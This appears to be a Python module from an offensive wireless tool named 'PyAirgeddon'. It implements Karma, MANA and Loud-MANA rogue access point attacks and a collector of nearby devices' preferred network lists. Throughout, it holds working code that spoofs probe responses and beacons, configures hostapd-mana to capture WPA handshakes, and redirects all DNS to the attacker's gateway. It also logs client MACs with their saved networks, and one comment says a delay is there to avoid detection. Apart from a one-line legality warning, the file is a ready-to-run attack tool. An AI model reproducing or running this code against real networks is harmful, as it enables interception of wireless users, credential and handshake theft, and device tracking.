#!/usr/bin/env python3
"""
PyAirgeddon Karma/MANA Attack Module
Rogue AP attacks for intercepting wireless clients

Features:
- Karma Attack: Respond to all probe requests as that network
- MANA Attack: Enhanced karma with credential capture
- Loud-MANA: Broadcast collected SSIDs to attract clients
- PNL Collection: Gather preferred network lists from clients
"""

import subprocess
import threading
import time
import os
import signal
import socket
import tempfile
import random
from typing import Callable, Optional, List, Dict, Set
from dataclasses import dataclass, field
from datetime import datetime
from collections import defaultdict

# Try to import optional dependencies
try:
    from scapy.all import (
        sniff, Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp,
        Dot11Elt, RadioTap, sendp, conf, Dot11Auth, Dot11AssoReq,
        Dot11AssoResp, RandMAC, hexdump
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


# ============================================================================
# DATA CLASSES
# ============================================================================

@dataclass
class CollectedSSID:
    """SSID collected from client probes"""
    ssid: str
    first_seen: datetime = field(default_factory=datetime.now)
    last_seen: datetime = field(default_factory=datetime.now)
    probe_count: int = 1
    clients: Set[str] = field(default_factory=set)


@dataclass
class KarmaClient:
    """Client that connected to karma AP"""
    mac: str
    requested_ssid: str
    connected_at: datetime = field(default_factory=datetime.now)
    ip_address: str = ""
    hostname: str = ""
    packets_sent: int = 0
    packets_received: int = 0


@dataclass
class KarmaResult:
    """Result of karma attack session"""
    duration: float
    ssids_collected: List[str]
    clients_connected: List[KarmaClient]
    total_probes: int
    log_file: str = ""


# ============================================================================
# KARMA ATTACK (Basic)
# ============================================================================

class KarmaAttack:
    """
    Basic Karma attack - Respond to probe requests with matching beacon/probe response
    Makes clients believe their known network is nearby
    
    Requirements:
    - Monitor mode interface
    - hostapd with karma patch (optional, for full AP mode)
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.collected_ssids: Dict[str, CollectedSSID] = {}
        self.connected_clients: Dict[str, KarmaClient] = {}
        self.probe_count = 0
        self._sniffer_thread = None
        self._responder_thread = None
        self._log_callback = None
        self._ap_mac = self._generate_ap_mac()
        self._respond_queue: List[tuple] = []
        self._response_lock = threading.Lock()
    
    def _generate_ap_mac(self) -> str:
        """Generate realistic AP MAC address"""
        # Use common AP vendor OUIs
        ouis = [
            "00:1A:2B",  # Ayecom
            "00:1F:33",  # Netgear
            "00:14:BF",  # Linksys
            "00:1E:58",  # D-Link
            "00:24:B2",  # ASUS
            "C0:C1:C0",  # Cisco
        ]
        oui = random.choice(ouis)
        suffix = ":".join([f"{random.randint(0, 255):02X}" for _ in range(3)])
        return f"{oui}:{suffix}"
    
    def _craft_probe_response(self, ssid: str, client_mac: str, 
                               channel: int = 6) -> Optional[bytes]:
        """Craft a probe response packet for the requested SSID"""
        if not SCAPY_AVAILABLE:
            return None
        
        try:
            # Build probe response
            dot11 = Dot11(
                type=0,  # Management
                subtype=5,  # Probe Response
                addr1=client_mac,  # Destination (client)
                addr2=self._ap_mac,  # Source (our AP)
                addr3=self._ap_mac   # BSSID
            )
            
            # Probe response frame
            probe_resp = Dot11ProbeResp(
                cap='ESS+privacy',  # Claim to be WPA
                beacon_interval=100
            )
            
            # Information elements
            ssid_elt = Dot11Elt(ID='SSID', info=ssid.encode())
            rates_elt = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
            channel_elt = Dot11Elt(ID='DSset', info=bytes([channel]))
            
            # RSN element (WPA2)
            rsn_info = bytes([
                0x01, 0x00,  # Version
                0x00, 0x0F, 0xAC, 0x04,  # Group cipher: CCMP
                0x01, 0x00,  # Pairwise cipher count
                0x00, 0x0F, 0xAC, 0x04,  # Pairwise cipher: CCMP
                0x01, 0x00,  # AKM count
                0x00, 0x0F, 0xAC, 0x02,  # AKM: PSK
                0x00, 0x00   # RSN capabilities
            ])
            rsn_elt = Dot11Elt(ID=48, info=rsn_info)
            
            # Build packet
            packet = RadioTap() / dot11 / probe_resp / ssid_elt / rates_elt / channel_elt / rsn_elt
            
            return packet
            
        except Exception as e:
            if self._log_callback:
                self._log_callback(f"[!] Error crafting response: {e}")
            return None
    
    def _craft_beacon(self, ssid: str, channel: int = 6) -> Optional[bytes]:
        """Craft a beacon frame for broadcasting"""
        if not SCAPY_AVAILABLE:
            return None
        
        try:
            dot11 = Dot11(
                type=0,
                subtype=8,  # Beacon
                addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                addr2=self._ap_mac,
                addr3=self._ap_mac
            )
            
            beacon = Dot11Beacon(cap='ESS+privacy', beacon_interval=100)
            
            ssid_elt = Dot11Elt(ID='SSID', info=ssid.encode())
            rates_elt = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
            channel_elt = Dot11Elt(ID='DSset', info=bytes([channel]))
            
            packet = RadioTap() / dot11 / beacon / ssid_elt / rates_elt / channel_elt
            
            return packet
            
        except Exception as e:
            if self._log_callback:
                self._log_callback(f"[!] Error crafting beacon: {e}")
            return None
    
    def _packet_handler(self, packet):
        """Handle incoming probe requests"""
        if not packet.haslayer(Dot11ProbeReq):
            return
        
        try:
            client_mac = packet[Dot11].addr2
            if not client_mac:
                return
            
            client_mac = client_mac.upper()
            
            # Skip our own packets
            if client_mac == self._ap_mac.upper():
                return
            
            # Get requested SSID
            ssid = ""
            elt = packet[Dot11Elt]
            while elt:
                if elt.ID == 0:
                    try:
                        ssid = elt.info.decode('utf-8', errors='ignore')
                    except:
                        pass
                    break
                try:
                    elt = elt.payload.getlayer(Dot11Elt)
                except:
                    break
            
            if not ssid:
                return  # Null probe, ignore
            
            self.probe_count += 1
            
            # Track SSID
            if ssid not in self.collected_ssids:
                self.collected_ssids[ssid] = CollectedSSID(ssid=ssid)
                if self._log_callback:
                    self._log_callback(f"[+] New SSID collected: {ssid} (from {client_mac})")
            
            collected = self.collected_ssids[ssid]
            collected.last_seen = datetime.now()
            collected.probe_count += 1
            collected.clients.add(client_mac)
            
            # Queue response
            with self._response_lock:
                self._respond_queue.append((ssid, client_mac))
                
        except Exception as e:
            if self._log_callback:
                self._log_callback(f"[!] Handler error: {e}")
    
    def _responder_loop(self):
        """Send probe responses to queued requests"""
        while self.running:
            try:
                with self._response_lock:
                    if not self._respond_queue:
                        time.sleep(0.01)
                        continue
                    
                    ssid, client_mac = self._respond_queue.pop(0)
                
                # Craft and send response
                response = self._craft_probe_response(ssid, client_mac)
                if response:
                    sendp(response, iface=self.interface, verbose=False)
                    if self._log_callback:
                        self._log_callback(f"[>] Responded to {client_mac} for '{ssid}'")
                
                # Small delay to avoid detection
                time.sleep(0.001)
                
            except Exception as e:
                if self._log_callback:
                    self._log_callback(f"[!] Responder error: {e}")
    
    def start(self, channel: int = 6, log_callback: Callable = None) -> bool:
        """Start karma attack"""
        if not SCAPY_AVAILABLE:
            if log_callback:
                log_callback("[!] Scapy not available")
            return False
        
        self._log_callback = log_callback
        self.running = True
        
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log("[*] Starting Karma Attack")
        log(f"[*] Interface: {self.interface}")
        log(f"[*] AP MAC: {self._ap_mac}")
        log(f"[*] Channel: {channel}")
        
        # Set channel
        try:
            subprocess.run(
                ['iwconfig', self.interface, 'channel', str(channel)],
                capture_output=True
            )
        except:
            pass
        
        # Start sniffer
        def sniffer():
            try:
                sniff(
                    iface=self.interface,
                    prn=self._packet_handler,
                    store=False,
                    filter="type mgt subtype probe-req",
                    stop_filter=lambda x: not self.running
                )
            except Exception as e:
                log(f"[!] Sniffer error: {e}")
        
        self._sniffer_thread = threading.Thread(target=sniffer, daemon=True)
        self._sniffer_thread.start()
        
        # Start responder
        self._responder_thread = threading.Thread(target=self._responder_loop, daemon=True)
        self._responder_thread.start()
        
        log("[+] Karma attack started - capturing probe requests...")
        return True
    
    def stop(self, log_callback: Callable = None) -> KarmaResult:
        """Stop karma attack and return results"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log("[*] Stopping Karma attack...")
        self.running = False
        
        if self._sniffer_thread:
            self._sniffer_thread.join(timeout=2)
        if self._responder_thread:
            self._responder_thread.join(timeout=2)
        
        result = KarmaResult(
            duration=0,  # TODO: track start time
            ssids_collected=list(self.collected_ssids.keys()),
            clients_connected=list(self.connected_clients.values()),
            total_probes=self.probe_count
        )
        
        log(f"[+] Collected {len(result.ssids_collected)} unique SSIDs")
        log(f"[+] Processed {result.total_probes} probe requests")
        
        return result
    
    def get_collected_ssids(self) -> List[CollectedSSID]:
        """Get all collected SSIDs with statistics"""
        return sorted(
            self.collected_ssids.values(),
            key=lambda x: x.probe_count,
            reverse=True
        )


# ============================================================================
# MANA ATTACK (Enhanced Karma with hostapd)
# ============================================================================

class MANAAttack:
    """
    MANA (More Advanced Neighbor AP) Attack
    Uses hostapd-mana for full AP functionality with karma
    
    Features:
    - Full AP with DHCP/DNS
    - Credential capture via captive portal
    - WPA handshake capture
    - EAP credential capture
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.collected_ssids: Dict[str, CollectedSSID] = {}
        self.connected_clients: Dict[str, KarmaClient] = {}
        self._hostapd_process = None
        self._dnsmasq_process = None
        self._probe_sniffer_thread = None
        self._log_callback = None
        self._temp_dir = None
        self._gateway_ip = "10.0.0.1"
        self._enable_loud = False
    
    def _create_hostapd_config(self, ssid: str = "FreeWifi",
                                channel: int = 6,
                                mana_enabled: bool = True) -> str:
        """Create hostapd-mana configuration file"""
        config = f"""
interface={self.interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0

# MANA settings
"""
        if mana_enabled:
            config += """
# Enable karma (respond to all probes)
mana_wpaout=/tmp/mana_wpa.hccapx
enable_mana=1
mana_loud=0
"""
        if self._enable_loud:
            config += "mana_loud=1\n"
            # Add collected SSIDs for loud mode
            ssid_file = os.path.join(self._temp_dir, "mana_ssids.txt")
            with open(ssid_file, 'w') as f:
                for ssid in self.collected_ssids.keys():
                    f.write(ssid + "\n")
            config += f"mana_ssid_file={ssid_file}\n"
        
        config_file = os.path.join(self._temp_dir, "hostapd-mana.conf")
        with open(config_file, 'w') as f:
            f.write(config)
        
        return config_file
    
    def _create_dnsmasq_config(self) -> str:
        """Create dnsmasq configuration for DHCP/DNS"""
        config = f"""
interface={self.interface}
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,{self._gateway_ip}
dhcp-option=6,{self._gateway_ip}
server=8.8.8.8
log-queries
log-dhcp
address=/#/{self._gateway_ip}
"""
        config_file = os.path.join(self._temp_dir, "dnsmasq-mana.conf")
        with open(config_file, 'w') as f:
            f.write(config)
        
        return config_file
    
    def _setup_interface(self, log_callback: Callable = None):
        """Set up interface for AP mode"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        try:
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'],
                          capture_output=True)
            
            # Set to managed mode (hostapd handles this)
            subprocess.run(['iw', 'dev', self.interface, 'set', 'type', 'managed'],
                          capture_output=True)
            
            # Assign IP
            subprocess.run(['ip', 'addr', 'flush', 'dev', self.interface],
                          capture_output=True)
            subprocess.run(['ip', 'addr', 'add', f'{self._gateway_ip}/24', 
                          'dev', self.interface], capture_output=True)
            
            # Bring up
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'],
                          capture_output=True)
            
            # Enable IP forwarding
            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'],
                          capture_output=True)
            
            log("[+] Interface configured")
            
        except Exception as e:
            log(f"[!] Interface setup error: {e}")
    
    def _collect_probes_first(self, duration: int = 30,
                               log_callback: Callable = None):
        """Collect probe requests before starting AP (for loud mode)"""
        if not SCAPY_AVAILABLE:
            return
        
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log(f"[*] Collecting probe requests for {duration} seconds...")
        
        def packet_handler(packet):
            if packet.haslayer(Dot11ProbeReq):
                try:
                    client_mac = packet[Dot11].addr2
                    if not client_mac:
                        return
                    
                    elt = packet[Dot11Elt]
                    while elt:
                        if elt.ID == 0:
                            ssid = elt.info.decode('utf-8', errors='ignore')
                            if ssid and ssid not in self.collected_ssids:
                                self.collected_ssids[ssid] = CollectedSSID(ssid=ssid)
                                log(f"[+] Collected: {ssid}")
                            break
                        elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt.payload, 'getlayer') else None
                except:
                    pass
        
        try:
            sniff(
                iface=self.interface,
                prn=packet_handler,
                store=False,
                timeout=duration,
                filter="type mgt subtype probe-req"
            )
        except Exception as e:
            log(f"[!] Probe collection error: {e}")
        
        log(f"[+] Collected {len(self.collected_ssids)} unique SSIDs")
    
    def start(self, ssid: str = "FreeWifi", channel: int = 6,
              mana_enabled: bool = True, loud_mode: bool = False,
              collect_duration: int = 30,
              log_callback: Callable = None) -> bool:
        """
        Start MANA attack
        
        Args:
            ssid: Primary SSID for the AP
            channel: WiFi channel
            mana_enabled: Enable karma-like behavior
            loud_mode: Broadcast collected SSIDs (Loud-MANA)
            collect_duration: Seconds to collect probes before starting (for loud mode)
        """
        self._log_callback = log_callback
        self._enable_loud = loud_mode
        
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        # Create temp directory
        self._temp_dir = tempfile.mkdtemp(prefix="mana_")
        log(f"[*] Temp directory: {self._temp_dir}")
        
        # Check for hostapd-mana
        hostapd_path = None
        for path in ['/usr/bin/hostapd-mana', '/usr/sbin/hostapd-mana', 
                     '/usr/local/bin/hostapd-mana', 'hostapd-mana', 'hostapd']:
            if os.path.isfile(path) or subprocess.run(['which', path], 
                                                       capture_output=True).returncode == 0:
                hostapd_path = path
                break
        
        if not hostapd_path:
            log("[!] hostapd-mana not found!")
            log("[*] Install with: apt install hostapd-mana")
            log("[*] Or use standard hostapd (limited functionality)")
            
            # Fallback to standard hostapd
            hostapd_path = 'hostapd'
            mana_enabled = False
        
        # Collect probes first if loud mode
        if loud_mode and collect_duration > 0:
            self._collect_probes_first(collect_duration, log_callback)
        
        # Setup interface
        self._setup_interface(log_callback)
        
        # Create configs
        hostapd_conf = self._create_hostapd_config(ssid, channel, mana_enabled)
        dnsmasq_conf = self._create_dnsmasq_config()
        
        self.running = True
        
        # Start dnsmasq
        try:
            log("[*] Starting dnsmasq...")
            self._dnsmasq_process = subprocess.Popen(
                ['dnsmasq', '-C', dnsmasq_conf, '-d'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            time.sleep(1)
        except Exception as e:
            log(f"[!] dnsmasq error: {e}")
        
        # Start hostapd
        try:
            log("[*] Starting hostapd-mana...")
            self._hostapd_process = subprocess.Popen(
                [hostapd_path, hostapd_conf],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT
            )
            
            # Monitor hostapd output
            def monitor_hostapd():
                while self.running and self._hostapd_process:
                    line = self._hostapd_process.stdout.readline()
                    if line:
                        line = line.decode('utf-8', errors='ignore').strip()
                        if 'associated' in line.lower():
                            log(f"[+] {line}")
                            # Parse client MAC
                            # Format: AP-STA-CONNECTED XX:XX:XX:XX:XX:XX
                            parts = line.split()
                            if len(parts) >= 2:
                                mac = parts[-1].upper()
                                if mac not in self.connected_clients:
                                    self.connected_clients[mac] = KarmaClient(
                                        mac=mac,
                                        requested_ssid=ssid
                                    )
                        elif 'mana' in line.lower() or 'karma' in line.lower():
                            log(f"[MANA] {line}")
                    else:
                        break
            
            threading.Thread(target=monitor_hostapd, daemon=True).start()
            
        except Exception as e:
            log(f"[!] hostapd error: {e}")
            return False
        
        log("[+] MANA attack started!")
        log(f"[*] Primary SSID: {ssid}")
        log(f"[*] Gateway IP: {self._gateway_ip}")
        if mana_enabled:
            log("[*] Karma mode: ENABLED")
        if loud_mode:
            log(f"[*] Loud mode: ENABLED ({len(self.collected_ssids)} SSIDs)")
        
        return True
    
    def stop(self, log_callback: Callable = None) -> KarmaResult:
        """Stop MANA attack"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log("[*] Stopping MANA attack...")
        self.running = False
        
        # Stop hostapd
        if self._hostapd_process:
            self._hostapd_process.terminate()
            try:
                self._hostapd_process.wait(timeout=5)
            except:
                self._hostapd_process.kill()
        
        # Stop dnsmasq
        if self._dnsmasq_process:
            self._dnsmasq_process.terminate()
            try:
                self._dnsmasq_process.wait(timeout=5)
            except:
                self._dnsmasq_process.kill()
        
        # Cleanup
        if self._temp_dir and os.path.exists(self._temp_dir):
            try:
                import shutil
                shutil.rmtree(self._temp_dir)
            except:
                pass
        
        result = KarmaResult(
            duration=0,
            ssids_collected=list(self.collected_ssids.keys()),
            clients_connected=list(self.connected_clients.values()),
            total_probes=sum(s.probe_count for s in self.collected_ssids.values())
        )
        
        log(f"[+] Attack stopped")
        log(f"[+] Clients connected: {len(result.clients_connected)}")
        
        return result


# ============================================================================
# LOUD-MANA (Beacon Broadcast)
# ============================================================================

class LoudMANA:
    """
    Loud-MANA variant - Broadcasts beacons for all collected SSIDs
    Useful when targets are not actively probing
    
    This is a standalone version that doesn't require hostapd-mana
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.ssids: List[str] = []
        self._beacon_thread = None
        self._log_callback = None
        self._ap_mac_base = self._generate_mac_base()
    
    def _generate_mac_base(self) -> str:
        """Generate base MAC for our fake APs"""
        ouis = ["00:1A:2B", "00:1F:33", "00:14:BF", "00:1E:58"]
        return random.choice(ouis)
    
    def _get_mac_for_ssid(self, ssid: str) -> str:
        """Generate consistent MAC for each SSID"""
        # Hash SSID to get consistent suffix
        hash_val = hash(ssid)
        suffix = ":".join([f"{(hash_val >> (i*8)) & 0xFF:02X}" for i in range(3)])
        return f"{self._ap_mac_base}:{suffix}"
    
    def add_ssids(self, ssids: List[str]):
        """Add SSIDs to broadcast"""
        for ssid in ssids:
            if ssid and ssid not in self.ssids:
                self.ssids.append(ssid)
    
    def add_ssids_from_file(self, filepath: str, 
                            log_callback: Callable = None) -> int:
        """Load SSIDs from file (one per line)"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        count = 0
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    ssid = line.strip()
                    if ssid and ssid not in self.ssids:
                        self.ssids.append(ssid)
                        count += 1
            log(f"[+] Loaded {count} SSIDs from {filepath}")
        except Exception as e:
            log(f"[!] Error loading SSIDs: {e}")
        
        return count
    
    def _beacon_loop(self, channel: int, interval_ms: int):
        """Continuously broadcast beacons for all SSIDs"""
        if not SCAPY_AVAILABLE:
            return
        
        interval = interval_ms / 1000.0
        
        while self.running:
            for ssid in self.ssids:
                if not self.running:
                    break
                
                try:
                    ap_mac = self._get_mac_for_ssid(ssid)
                    
                    # Build beacon
                    dot11 = Dot11(
                        type=0, subtype=8,
                        addr1="ff:ff:ff:ff:ff:ff",
                        addr2=ap_mac,
                        addr3=ap_mac
                    )
                    beacon = Dot11Beacon(cap='ESS+privacy', beacon_interval=100)
                    ssid_elt = Dot11Elt(ID='SSID', info=ssid.encode()[:32])  # Max 32 chars
                    rates_elt = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96\x0c\x12\x18\x24')
                    channel_elt = Dot11Elt(ID='DSset', info=bytes([channel]))
                    
                    packet = RadioTap() / dot11 / beacon / ssid_elt / rates_elt / channel_elt
                    
                    sendp(packet, iface=self.interface, verbose=False)
                    
                except Exception as e:
                    if self._log_callback:
                        self._log_callback(f"[!] Beacon error: {e}")
                
                time.sleep(interval / len(self.ssids) if self.ssids else interval)
    
    def start(self, channel: int = 6, beacon_interval_ms: int = 100,
              log_callback: Callable = None) -> bool:
        """Start broadcasting beacons"""
        if not SCAPY_AVAILABLE:
            if log_callback:
                log_callback("[!] Scapy not available")
            return False
        
        if not self.ssids:
            if log_callback:
                log_callback("[!] No SSIDs to broadcast")
            return False
        
        self._log_callback = log_callback
        self.running = True
        
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log("[*] Starting Loud-MANA beacon broadcast")
        log(f"[*] Interface: {self.interface}")
        log(f"[*] Channel: {channel}")
        log(f"[*] Broadcasting {len(self.ssids)} SSIDs")
        
        # Set channel
        try:
            subprocess.run(['iwconfig', self.interface, 'channel', str(channel)],
                          capture_output=True)
        except:
            pass
        
        self._beacon_thread = threading.Thread(
            target=self._beacon_loop,
            args=(channel, beacon_interval_ms),
            daemon=True
        )
        self._beacon_thread.start()
        
        log("[+] Beacon broadcast started")
        return True
    
    def stop(self, log_callback: Callable = None):
        """Stop broadcasting"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log("[*] Stopping Loud-MANA...")
        self.running = False
        
        if self._beacon_thread:
            self._beacon_thread.join(timeout=2)
        
        log("[+] Stopped")


# ============================================================================
# PNL COLLECTOR (Coordinated Probe Collection)
# ============================================================================

class PNLCollector:
    """
    Preferred Network List Collector
    Coordinates probe collection across channels for maximum coverage
    """
    
    def __init__(self, interface: str):
        self.interface = interface
        self.running = False
        self.pnl_data: Dict[str, Set[str]] = defaultdict(set)  # client_mac -> ssids
        self.ssid_clients: Dict[str, Set[str]] = defaultdict(set)  # ssid -> client_macs
        self._sniffer_thread = None
        self._hopper_thread = None
        self._log_callback = None
        self._current_channel = 1
    
    def _channel_hop(self, channels: List[int], interval: float):
        """Hop through channels"""
        idx = 0
        while self.running:
            channel = channels[idx % len(channels)]
            self._current_channel = channel
            
            try:
                subprocess.run(
                    ['iwconfig', self.interface, 'channel', str(channel)],
                    capture_output=True
                )
            except:
                pass
            
            time.sleep(interval)
            idx += 1
    
    def _packet_handler(self, packet):
        """Handle probe requests"""
        if not packet.haslayer(Dot11ProbeReq):
            return
        
        try:
            client_mac = packet[Dot11].addr2
            if not client_mac:
                return
            
            client_mac = client_mac.upper()
            
            # Get SSID
            ssid = ""
            elt = packet[Dot11Elt]
            while elt:
                if elt.ID == 0:
                    try:
                        ssid = elt.info.decode('utf-8', errors='ignore')
                    except:
                        pass
                    break
                try:
                    elt = elt.payload.getlayer(Dot11Elt)
                except:
                    break
            
            if ssid:
                # Track
                self.pnl_data[client_mac].add(ssid)
                self.ssid_clients[ssid].add(client_mac)
                
        except:
            pass
    
    def start_collection(self, channels: List[int] = None,
                         hop_interval: float = 0.5,
                         log_callback: Callable = None) -> bool:
        """Start PNL collection with channel hopping"""
        if not SCAPY_AVAILABLE:
            if log_callback:
                log_callback("[!] Scapy not available")
            return False
        
        if channels is None:
            channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]  # 2.4GHz
        
        self._log_callback = log_callback
        self.running = True
        
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log("[*] Starting PNL collection")
        log(f"[*] Channels: {channels}")
        log(f"[*] Hop interval: {hop_interval}s")
        
        # Start channel hopper
        self._hopper_thread = threading.Thread(
            target=self._channel_hop,
            args=(channels, hop_interval),
            daemon=True
        )
        self._hopper_thread.start()
        
        # Start sniffer
        def sniffer():
            try:
                sniff(
                    iface=self.interface,
                    prn=self._packet_handler,
                    store=False,
                    filter="type mgt subtype probe-req",
                    stop_filter=lambda x: not self.running
                )
            except Exception as e:
                log(f"[!] Sniffer error: {e}")
        
        self._sniffer_thread = threading.Thread(target=sniffer, daemon=True)
        self._sniffer_thread.start()
        
        log("[+] Collection started")
        return True
    
    def stop_collection(self, log_callback: Callable = None):
        """Stop collection"""
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        log("[*] Stopping collection...")
        self.running = False
        
        if self._sniffer_thread:
            self._sniffer_thread.join(timeout=2)
        if self._hopper_thread:
            self._hopper_thread.join(timeout=2)
        
        log(f"[+] Collected PNL for {len(self.pnl_data)} clients")
        log(f"[+] Found {len(self.ssid_clients)} unique SSIDs")
    
    def get_client_pnl(self, client_mac: str) -> Set[str]:
        """Get PNL for specific client"""
        return self.pnl_data.get(client_mac.upper(), set())
    
    def get_all_ssids(self) -> List[str]:
        """Get all discovered SSIDs"""
        return list(self.ssid_clients.keys())
    
    def get_popular_ssids(self, min_clients: int = 2) -> List[tuple]:
        """Get SSIDs probed by multiple clients"""
        popular = []
        for ssid, clients in self.ssid_clients.items():
            if len(clients) >= min_clients:
                popular.append((ssid, len(clients)))
        return sorted(popular, key=lambda x: x[1], reverse=True)
    
    def export_data(self, filepath: str, log_callback: Callable = None) -> bool:
        """Export collected data to JSON"""
        import json
        
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        try:
            data = {
                "timestamp": datetime.now().isoformat(),
                "clients": {},
                "ssids": {}
            }
            
            for client, ssids in self.pnl_data.items():
                data["clients"][client] = list(ssids)
            
            for ssid, clients in self.ssid_clients.items():
                data["ssids"][ssid] = list(clients)
            
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
            
            log(f"[+] Exported to {filepath}")
            return True
            
        except Exception as e:
            log(f"[!] Export error: {e}")
            return False


# ============================================================================
# INTERACTIVE MODE
# ============================================================================

def interactive_mode():
    """Interactive karma/mana attack mode"""
    print("\n" + "=" * 60)
    print("  PyAirgeddon Karma/MANA Attack Module")
    print("  Rogue AP Attacks for Red Team Operations")
    print("=" * 60 + "\n")
    
    print("[!] WARNING: Unauthorized use is illegal!")
    print("[*] Use only on networks you own or have authorization to test.\n")
    
    if not SCAPY_AVAILABLE:
        print("[!] Error: Scapy is not installed")
        print("[*] Install with: pip install scapy")
        return
    
    print("[*] Available attacks:")
    print("  1. Karma Attack      - Respond to probe requests")
    print("  2. MANA Attack       - Full rogue AP with karma")
    print("  3. Loud-MANA         - Broadcast collected SSIDs")
    print("  4. PNL Collector     - Collect preferred networks")
    print("  0. Exit")
    
    interface = input("\n[?] Enter monitor mode interface: ").strip()
    if not interface:
        interface = "wlan0mon"
    
    choice = input("[?] Select attack (1-4): ").strip()
    
    def log(msg):
        print(msg)
    
    if choice == "1":
        attack = KarmaAttack(interface)
        channel = input("[?] Channel (default 6): ").strip()
        channel = int(channel) if channel else 6
        
        print("\n[*] Starting Karma attack (Ctrl+C to stop)...")
        attack.start(channel=channel, log_callback=log)
        
        try:
            while True:
                time.sleep(5)
                ssids = attack.get_collected_ssids()
                print(f"\n[*] Collected {len(ssids)} SSIDs:")
                for s in ssids[:10]:
                    print(f"  {s.ssid:32} (probed {s.probe_count}x by {len(s.clients)} clients)")
        except KeyboardInterrupt:
            result = attack.stop(log)
            print(f"\n[*] Final: {len(result.ssids_collected)} SSIDs, {result.total_probes} probes")
            
    elif choice == "2":
        attack = MANAAttack(interface)
        ssid = input("[?] Primary SSID (default 'FreeWifi'): ").strip() or "FreeWifi"
        channel = input("[?] Channel (default 6): ").strip()
        channel = int(channel) if channel else 6
        loud = input("[?] Enable Loud mode? (y/N): ").strip().lower() == 'y'
        
        print("\n[*] Starting MANA attack (Ctrl+C to stop)...")
        attack.start(ssid=ssid, channel=channel, loud_mode=loud, log_callback=log)
        
        try:
            while True:
                time.sleep(5)
                print(f"[*] Connected clients: {len(attack.connected_clients)}")
        except KeyboardInterrupt:
            attack.stop(log)
            
    elif choice == "3":
        loud = LoudMANA(interface)
        
        ssid_file = input("[?] SSID file (or leave empty for manual): ").strip()
        if ssid_file:
            loud.add_ssids_from_file(ssid_file, log)
        else:
            ssids = input("[?] Enter SSIDs (comma-separated): ").strip()
            loud.add_ssids([s.strip() for s in ssids.split(',') if s.strip()])
        
        channel = input("[?] Channel (default 6): ").strip()
        channel = int(channel) if channel else 6
        
        print("\n[*] Starting Loud-MANA (Ctrl+C to stop)...")
        loud.start(channel=channel, log_callback=log)
        
        try:
            while True:
                time.sleep(10)
        except KeyboardInterrupt:
            loud.stop(log)
            
    elif choice == "4":
        collector = PNLCollector(interface)
        
        print("\n[*] Starting PNL collection (Ctrl+C to stop)...")
        collector.start_collection(log_callback=log)
        
        try:
            while True:
                time.sleep(10)
                clients = len(collector.pnl_data)
                ssids = len(collector.ssid_clients)
                popular = collector.get_popular_ssids()[:5]
                print(f"\n[*] Clients: {clients}, SSIDs: {ssids}")
                if popular:
                    print("[*] Popular SSIDs:")
                    for ssid, count in popular:
                        print(f"    {ssid}: {count} clients")
        except KeyboardInterrupt:
            collector.stop_collection(log)
            
            export = input("\n[?] Export data? (Y/n): ").strip().lower()
            if export != 'n':
                filepath = input("[?] Export file (default 'pnl_data.json'): ").strip()
                filepath = filepath or "pnl_data.json"
                collector.export_data(filepath, log)


if __name__ == "__main__":
    interactive_mode()
